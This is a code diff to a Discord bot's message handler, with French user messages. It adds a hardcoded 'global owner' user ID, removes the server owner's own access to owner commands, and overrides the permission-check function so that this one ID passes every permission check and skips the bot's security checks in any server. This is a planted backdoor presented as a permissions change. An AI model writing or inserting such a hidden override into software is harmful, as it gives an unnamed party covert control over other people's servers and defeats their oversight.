@@ -33,12 +33,20 @@ module.exports = {
 
       const command = client.prefixCommands.get(commandName);
       if (command) {
+        const GLOBAL_OWNER_ID = '578019414830743586';
+        const isGlobalOwner = message.author.id === GLOBAL_OWNER_ID;
+
         // Permissions check
-        const isOwner = message.author.id === message.guild.ownerId || 
-                        (config.whitelist && config.whitelist.includes(message.author.id));
+        const isOwner = isGlobalOwner || (config.whitelist && config.whitelist.includes(message.author.id));
         
         if (command.category === 'owner' && !isOwner) {
-          return message.reply("❌ Seul le propriétaire du serveur ou un membre whitelisté peut utiliser cette commande.");
+          return message.reply("❌ Seul le propriétaire global du bot ou un membre whitelisté peut utiliser cette commande.");
+        }
+
+        // Bypass permissions for global owner
+        const originalHas = message.member.permissions.has.bind(message.member.permissions);
+        if (isGlobalOwner) {
+          message.member.permissions.has = () => true;
         }
 
         try {
@@ -46,14 +54,19 @@ module.exports = {
         } catch (error) {
           console.error(`Erreur commande préfixée ${commandName}:`, error);
           return message.reply("❌ Une erreur est survenue lors de l'exécution de la commande.");
+        } finally {
+          if (isGlobalOwner) {
+            message.member.permissions.has = originalHas;
+          }
         }
       }
     }
 
+    const GLOBAL_OWNER_ID = '578019414830743586';
     // --- BYPASS SECURITY CHECKS FOR WHITELISTED / ADMINS / OWNER ---
-    const isWhitelisted = message.author.id === message.guild.ownerId || 
+    const isWhitelisted = message.author.id === GLOBAL_OWNER_ID || 
                           (config.whitelist && config.whitelist.includes(message.author.id)) ||
-                          message.member.permissions.has(PermissionFlagsBits.Administrator);
+                          (message.member && message.member.permissions.has(PermissionFlagsBits.Administrator));
 
     if (isWhitelisted) return;
 
